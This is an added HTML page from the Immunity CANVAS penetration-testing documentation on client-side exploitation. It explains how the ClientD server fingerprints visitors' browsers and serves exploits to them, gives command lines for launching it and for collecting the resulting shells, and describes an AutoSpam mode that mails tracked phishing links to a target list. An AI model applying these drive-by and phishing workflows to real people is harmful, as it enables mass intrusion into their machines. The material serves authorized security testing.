@@ -1,0 +1,327 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>Exploiting Client-Side Vulnerablities &mdash; Immunity CANVAS 1 documentation</title>
+  
+
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+    <link rel="top" title="Immunity CANVAS 1 documentation" href="index.html"/>
+        <link rel="next" title="Post-Exploitation" href="post_exploitation.html"/>
+        <link rel="prev" title="Exploiting Windows Locally (Privilege Escalation)" href="basics_win_local.html"/> 
+
+  
+  <script src="_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="index.html" class="icon icon-home"> Immunity CANVAS
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+                <ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="license.html">CANVAS EULA</a></li>
+<li class="toctree-l1"><a class="reference internal" href="install.html">Installing CANVAS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="terminology.html">Terminology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="canvas_intro.html">Getting Started</a></li>
+<li class="toctree-l1"><a class="reference internal" href="canvas_basics.html">CANVAS Basic Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="basics_win_remote.html">Exploiting Windows Remotely</a></li>
+<li class="toctree-l1"><a class="reference internal" href="basics_win_local.html">Exploiting Windows Locally (Privilege Escalation)</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="">Exploiting Client-Side Vulnerablities</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#clientd-commandline-mode">ClientD Commandline Mode</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#autospam-mode">AutoSpam mode:</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="post_exploitation.html">Post-Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="canvas_tips.html">Canvas Tips and Tricks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="canvas_videos.html">Canvas Video Tutorials</a></li>
+<li class="toctree-l1"><a class="reference internal" href="canvas_advanced.html">CANVAS Advanced Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="canvas_strategic.html">CANVAS Strategic</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="index.html">Immunity CANVAS</a>
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+ 
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="index.html">Docs</a> &raquo;</li>
+      
+    <li>Exploiting Client-Side Vulnerablities</li>
+      <li class="wy-breadcrumbs-aside">
+        
+          
+            <a href="_sources/basics_clientside.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="exploiting-client-side-vulnerablities">
+<h1>Exploiting Client-Side Vulnerablities<a class="headerlink" href="#exploiting-client-side-vulnerablities" title="Permalink to this headline">¶</a></h1>
+<p>Canvas is well suited to serving and handling client-side attacks in addition to remote attacks. Since there are a wide range and different classications of vulnerablities are supported by CANVAS, the  exploitation methods used by CANVAS are dependent on the type of exploit. In most cases when dealing with client-side vulnerabilities, the vulnerability can be triggered from a web-browser. For these situations, CANVAS provides a dedicated engine for automatically selecting, serving and handling browser based exploits. Vulnerabilities in the browser (IE, Firefox, etc.) or third party plugings (Adobe Reader, Adobe Flash, MS-Office, etc.) are examples of such cases.</p>
+<p>Instead of individually selecting specific modules for each vulnerability, CANVAS has an an automated engine that will fingerprint the client&#8217;s browser, and based on identified plugins and their versions, deliver one or multiple exploits to the target(s). This process is handled by the <code class="docutils literal"><span class="pre">ClientD</span></code> module, accessible under the <code class="docutils literal"><span class="pre">Servers</span></code> category in Canvas modules tree.</p>
+<img alt="_images/canvas_clientd.png" src="_images/canvas_clientd.png" />
+<p>The ClientD module is capable of handling multiple targets and visitors at the same time, making it an ideal tool for phishing and client-side exploitation campaigns in real-world scenarios and penetration tests. ClientD can be configured and used in multiple ways. In general it works as a simple web server, presenting whatever exploits have been selected to any client accessing it. If more than one exploit module is selected, then for every visitor, ClientD will iterate through the list and serve them to the client one after each other followed by a default session timeout timer. If the <em>&#8220;Automatically Detect Exploits&#8221;</em> option is selected, based on the identified browser and plugins information provided via the <code class="docutils literal"><span class="pre">jsrecon</span></code> module, a number of exploits from the selection list will be delivered to the client. This option is enabled by default, and Canvas is already configured to use a number of reliable and most common vulnerabilities that are available in the Canvas. This can of course be turned off, and configured to specify one or many specific exploits from the list.</p>
+<p>The second option <em>&#8220;Always Do Recon&#8221;</em> enforces an is_vulnerable check against the selected list of exploits, so that if ClientD detects that the visitor might not be vulnerable to the selected exploit, it will not be delivered. This feature is quiet useful specially when you want to test multiple vulnerabilities
+against every client and only try the ones that will potentially succeed. On the other hand, some specific client side vulnerabilities such as the ones relying on heap spraying exploitation technique might face with stability issues, due to execution of the <code class="docutils literal"><span class="pre">jsrecon</span></code> module which will change the layout of the heap in the exploited process.</p>
+<p>If the automatically detect exploits options is enabled, based on fingerprinted data, ClientD might automatically add exploits to the list, even if they are not selected. Such automatically selected exploits are always tested before the manually selected ones and have a higher priority to be executed. If the <em>&#8220;Always Do Recon&#8221;</em> option is disabled, ClientD will always attempt to run all selected exploits against every target, without performing any checks whether they might be vulnerable or not.</p>
+<p>ClientD was written to allow the concurrent exploitation of multiple clients. It operates on a session id logic that has an associated active module and allowed exploit list. Every active module is a unique instance of a makesploit FSM and the session id logic allows for client session identification. This translates to a HTTP Server that can exploit multiple clients in parallel, with different exploits, in different phases of their exploitation process. This is useful when you expect to own more than one client, or when going after multiple clients that share the same source address (behind NAT or proxy).</p>
+<div class="section" id="clientd-commandline-mode">
+<h2>ClientD Commandline Mode<a class="headerlink" href="#clientd-commandline-mode" title="Permalink to this headline">¶</a></h2>
+<p>The ClientD server also allows for full independent commandline usage including multiple shell handling, as it operates with an XMLRPC CommandLine capable instance of the engine. Note that when running clientD from the commandline you can not have a GUI instance of CANVAS running.</p>
+<p>Following example shows running the ClientD from the commandline interface:</p>
+<p>1.Edit the allow list to your liking and start ClientD, the -l option correlates to the interface you want to receive your callbacks on</p>
+<div class="highlight-python"><div class="highlight"><pre>$       python ./exploits/server/clientd/clientd.py -l 192.168.1.100
+</pre></div>
+</div>
+<p>2.Wait for clients to connect, ClientD will do its thing in a fully automated fashion</p>
+<div class="highlight-python"><div class="highlight"><pre>$       192.168.1.102 - - [11/Aug/2009 17:32:36] &amp;quot;GET /SiteException.jar HTTP/1.1&amp;quot; 200 11475
+        [+] got existing session cookie
+        [+] HTTP_SESSION_ID: 1250026340.09
+        [+] HTTP_COOKIE: CANSessID=1250026340.09
+        [+] SERVER_PROTOCOL: HTTP/1.1
+        [+] QUERY_STRING:
+        [+] REQUEST_METHOD: GET
+        [+] HTTP_RAW_HEADERS: [&#39;User-Agent: Mozilla/4.0 (Windows 2000 5.0) Java/1.5.0_04
+        &#39;, &#39;Host: 192.168.1.100:8080
+        &#39;, &#39;Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        &#39;, &#39;Connection: keep-alive
+        &#39;, &#39;Content-type: application/x-www-form-urlencoded
+        &#39;, &#39;Cookie: CANSessID=1250026340.09
+        &#39;]
+        [+] HTTP_CONNECTION: keep-alive
+        [+] BODY_DATA:
+        [+] HTTP_RAW_REQUEST: GET /SiteException.jar HTTP/1.1
+        [+] CONTENT_LENGTH:
+        [+] HTTP_USER_AGENT: Mozilla/4.0 (Windows 2000 5.0) Java/1.5.0_04
+        [+] HTTP_HOST: 192.168.1.100:8080
+        [+] HTTP_ACCEPT: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        [+] REMOTE_ADDR: 192.168.1.102
+        [+] CONTENT_TYPE: application/x-www-form-urlencoded
+        [+] REMOTE_HOST:
+        [+] PATH_INFO: /SiteException.jar
+        [+] continue existing exploit session for client
+</pre></div>
+</div>
+<p>3.Reap your shells by attaching to the commandline engine instance with the xmlrpc client (note do NOT shut down the server, this is where your active shells are)</p>
+<div class="highlight-python"><div class="highlight"><pre>$       work@work-desktop:/media/disk/svn/CANVAS$ python cmdline.py
+        Setting CANVAS session to: default
+        Using &#39;Reports/default&#39; as base data output directory
+         _____ _____ _____ _____ _____ _____
+        |     |  _  |   | |  |  |  _  |   __|
+        |   --|     | | | |  |  |     |__   |
+        |_____|__|__|_|___|\___/|__|__|_____|
+                 *** XMLRPC cmdline v0.1 ***
+        &lt;&lt;&lt;CANVAS&gt;&gt;&gt; nodes
+        [+] Listing all active nodes
+        ID: 0 - win32Node:0-&gt;0
+        ID: 1 - JavaNode:0-&gt;1
+        [+] Listed all active nodes
+        &lt;&lt;&lt;CANVAS&gt;&gt;&gt;
+        ...
+</pre></div>
+</div>
+<p>The above nodes were reaped from 2 different clients on 2 different platforms, browsing to ClientD at the same time. This should scale moderately well (or better than the old httpserver anyways).</p>
+</div>
+<div class="section" id="autospam-mode">
+<h2>AutoSpam mode:<a class="headerlink" href="#autospam-mode" title="Permalink to this headline">¶</a></h2>
+<p>ClientD also includes an integrated spamming engine which, when enabled, will automatically generate unique URI&#8217;s for every target email supplied. When someone clicks that unique URI that session will automatically be associated with the target email sent out from the spammer. This allows for very good clientside-to-target correlation and coverage statistics. Example</p>
+<div class="highlight-python"><div class="highlight"><pre>$       python26 ./exploits/clientd/clientd -O spam:1 -O server_port:80 -O spam_targets:targets.txt -l remote.ip
+</pre></div>
+</div>
+<p>This command imports a list of targets from targets.txt, and then spams them a unique URI based on self.mail_from/self.subject/self.spam in the Spammer() object. To use a custom SMTP server, tunnel mail through a local SSH tunnel or setup a SMTP relay specifically to do SPAM, and configure the following options in  <code class="docutils literal"><span class="pre">canvas.conf</span></code> file (they are commented out by default)</p>
+<div class="highlight-python"><div class="highlight"><pre>$ # preferred smtp server for sending spam
+    preferred_smtp_host         = localhost
+        preferred_smtp_port         = 1025
+</pre></div>
+</div>
+<p>Subsequent visits from the targeted client/person will then be logged with full target correlation, which looks like the following (details censored)</p>
+<div class="highlight-python"><div class="highlight"><pre>$       ### Client Request @ Wed Aug 26 14:33:16 2009 ###
+        HTTP_COOKIE:&#39;CANSessID=1251311592.55&#39;
+        QUERY_STRING:&#39;&#39;
+        REQUEST_METHOD:&#39;GET&#39;
+        HTTP_KEEP_ALIVE:&#39;300&#39;
+        SERVER_PROTOCOL:&#39;HTTP/1.1&#39;
+        ...XXX...
+        CONTENT_LENGTH:&#39;&#39;
+        HTTP_ACCEPT_CHARSET:&#39;ISO-8859-1,utf-8;q=0.7,*;q=0.7&#39;
+        HTTP_USER_AGENT:&#39;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.13) Gecko/XXX XXX/XXX (XXX) Firefox/XXX&#39;
+        HTTP_CONNECTION:&#39;keep-alive&#39;
+        HTTP_RAW_REQUEST:&#39;GET /index.html HTTP/1.1
+        &#39;
+        REMOTE_ADDR:&#39;72.28.155.218&#39;
+        BODY_DATA:&#39;&#39;
+        HTTP_SESSION_ID:&#39;1251311592.55&#39;
+        HTTP_HOST:&#39;72.46.249.24&#39;
+        HTTP_ACCEPT:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;
+        HTTP_ACCEPT_LANGUAGE:&#39;en-us,en;q=0.5&#39;
+        CONTENT_TYPE:&#39;text/plain&#39;
+        SESSION_TARGET:&#39;bas@immunityinc.com&#39;
+        REMOTE_HOST:&#39;&#39;
+        HTTP_ACCEPT_ENCODING:&#39;gzip,deflate&#39;
+</pre></div>
+</div>
+<p>The SESSION_TARGET variable for every request in that session will be associated with the originally targeted email that supplied the URI from which the session was initiated.</p>
+<div class="admonition tip">
+<p class="first admonition-title">Tip</p>
+<p class="last">When choosing the exploits to try against your targets, it is always better to prioritize testing for more reliable exploits that trigger vulnerabilities that are not based on memory corruption. Java (JRE) browser plugin exploits in CANVAS are a great example. It is not uncommon to see outdated JRE plugins in enterprise networks. Another module that is often successful is the &#8216;generic_java_applet&#8217; which requires users to accept a warning prompt of running untrusted Java applet from the browser.</p>
+</div>
+</div>
+</div>
+
+
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="post_exploitation.html" class="btn btn-neutral float-right" title="Post-Exploitation" accesskey="n">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="basics_win_local.html" class="btn btn-neutral" title="Exploiting Windows Locally (Privilege Escalation)" accesskey="p"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2016, Immunity Inc..
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'./',
+            VERSION:'1',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true
+        };
+    </script>
+      <script type="text/javascript" src="_static/jquery.js"></script>
+      <script type="text/javascript" src="_static/underscore.js"></script>
+      <script type="text/javascript" src="_static/doctools.js"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
